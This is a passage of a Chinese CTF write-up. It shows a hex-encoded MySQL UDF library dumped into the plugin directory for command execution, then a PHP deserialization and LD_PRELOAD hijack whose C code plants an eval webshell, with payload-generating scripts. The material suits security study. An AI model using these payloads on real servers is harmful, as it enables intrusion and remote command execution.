4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000</span> <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure><p>利用原生sql语句，写入udf.so文件，然后创建自定义函数并调用命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> STRING SONAME <span class="hljs-string">&#x27;udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure><p>导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+-----+---------+----------+</span><br><span class="hljs-operator">|</span> name     <span class="hljs-operator">|</span> ret <span class="hljs-operator">|</span> dl      <span class="hljs-operator">|</span> type     <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+-----+---------+----------+</span><br><span class="hljs-operator">|</span> sys_eval <span class="hljs-operator">|</span>   <span class="hljs-number">0</span> <span class="hljs-operator">|</span> udf.dll <span class="hljs-operator">|</span> <span class="hljs-keyword">function</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+-----+---------+----------+</span><br></code></pre></td></tr></table></figure><p>这里的 sys_eval 支持自定义，接着就可以通过创建的这个函数来执行系统命令了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706134918265.png" alt="image-20240706134918265"></p><p>flag{2d401533-badd-4db8-b064-426b95038e80}</p><h1 id="Hijack"><a href="#Hijack" class="headerlink" title="Hijack"></a>Hijack</h1><p>这道题跟vnctf2024 givenphp很像，我当时这道题就没做出来&#x3D;-&#x3D;</p><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;\(&#x27;</span>,<span class="hljs-string">&#x27;\)&#x27;</span>,<span class="hljs-string">&#x27;;&#x27;</span>,<span class="hljs-string">&#x27;bash&#x27;</span>);<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$pattern</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No injecting!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ENV</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$math</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$key</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$this</span>-&gt;key);<br>        <span class="hljs-variable">$value</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$this</span>-&gt;value);<br>        <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$key</span>=<span class="hljs-subst">$value</span>&quot;</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat hints.txt&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;math-&gt;flag))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;YesYes&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;YesYesYes&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DIFF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$callback</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$back</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;callback-&gt;p;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are stupid, what exactly is your identity?&quot;</span>;<br><br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FILE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$enviroment</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;hacker&quot;</span>==<span class="hljs-variable language_">$this</span>-&gt;enviroment)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker is bad guy!!!&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$function_name</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\.[^.]*$/&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$matches</span>)) &#123;<br>            <span class="hljs-variable">$uploadDir</span> = <span class="hljs-string">&quot;/tmp/&quot;</span>;<br>            <span class="hljs-variable">$destination</span> = <span class="hljs-variable">$uploadDir</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>()) . <span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$uploadDir</span>)) &#123;<br>                <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$uploadDir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>            &#125;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$value</span>[<span class="hljs-number">0</span>]));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$destination</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件成功移动到$&#123;destination&#125;&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;文件移动失败。&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;非法文件名。&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FUN</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;fun-&gt;<span class="hljs-title function_ invoke__">getflag</span>(<span class="hljs-variable">$this</span>-&gt;value);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Harder&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这道题的关键点是给了提示，是LD_PRELOAD，<a href="https://blog.csdn.net/qq_63701832/article/details/129760495">https://blog.csdn.net/qq_63701832/article/details/129760495</a></p><p>LD_PRELOAD允许你定义在程序运行前优先加载的动态链接库，那么我们便可以在自己定义的动态链接库中装入恶意函数.假设现在出现了一种这样的情况，一个文件中有一个恶意构造的函数和我们程序指令执行时调用的函数一模一样，而LD_PRELOAD路径指向这个文件后，这个文件的优先级高于原本函数的文件，那么优先调用我们的恶意文件后会覆盖原本的那个函数，最后当我们执行了一个指令后它会自动调用一次恶意的函数，这就会导致一些非预期的漏洞出现</p><h4 id="核心思路："><a href="#核心思路：" class="headerlink" title="核心思路："></a>核心思路：</h4><p>我们看源码DIFF-&gt;__isset方法里使用了cat命令，我们如果可以修改cat命令里调用的函数，把他放到LD_PRELOAD里，这里ENV的putenv(“$key&#x3D;$value”);函数可以达成这个效果，正好FILE-&gt;call方法里有个文件上传点，我们把恶意函数封装成恶意so文件，上传上去，拿到文件路径。然后通过ENV类里的putenv函数把恶意so文件放到LD_PRELOAD里，那么在每次使用cat的时候，就会调用我们恶意so文件里封装的恶意函数，那么就可以达到RCE的效果。</p><p>我们先看看cat命令调用了哪些函数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ltrace <span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure><p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706140032088.png" alt="image-20240706140032088"></p><p>我们可以看到cat命令当中调用了很多函数，这里不列举，我们选择最简单的getpagesize() 函数进行污染竞争。</p><p>写个C文件，函数名称是getpagesize，这是我们的恶意函数，然后使用gcc命令把它封装成一个so文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getpagesize</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    system(<span class="hljs-string">&quot;echo &#x27;&lt;?php @eval($_POST[123]);?&gt;&#x27; &gt; /var/www/html/123.php&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc exp.c -o exp.so -fPIC -shared -ldl -D_GNU_SOURCE<br></code></pre></td></tr></table></figure><p>现在我们得到so文件了，利用反序列化上传上去，pop链的构造这里不再赘述。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ENV</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$math</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DIFF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$callback</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$back</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FILE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;1.so&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$enviroment</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FUN</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ENV</span>();<br><span class="hljs-variable">$a</span>-&gt;math = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">DIFF</span>();<br><span class="hljs-variable">$a</span>-&gt;math-&gt;callback = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">FUN</span>();<br><span class="hljs-variable">$a</span>-&gt;math-&gt;callback-&gt;fun = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">FILE</span>();<br><span class="hljs-variable">$a</span>-&gt;math-&gt;callback-&gt;value=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;./exp.so&quot;</span>));<br><span class="hljs-comment">//由于题目里是base64解码后写入文件，我们这里也通过base64读入value里。</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706140921515.png" alt="image-20240706140921515"></p><p>文件成功写入，我们记一下文件路径和名字&#x2F;tmp&#x2F;0df3a338b535b11d3ba93f518b697978.so</p><p>然后经过ENV的putenv(“$key&#x3D;$value”);把他放到LD_PRELOAD里，这里pop链的构造同样不再赘述。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ENV</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;LD_PRELOAD&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>=<span class="hljs-string">&#x27;/tmp/0df3a338b535b11d3ba93f518b697978.so&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$math</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DIFF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$callback</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$back</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>;<br><br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FILE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$enviroment</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FUN</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ENV</span>();<br><span class="hljs-variable">$a</span>-&gt;math = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">DIFF</span>();<br><span class="hljs-variable">$a</span>-&gt;math-&gt;callback = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">FILE</span>();<br><span class="hljs-variable">$a</span>-&gt;math-&gt;callback-&gt;enviroment=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ENV</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ 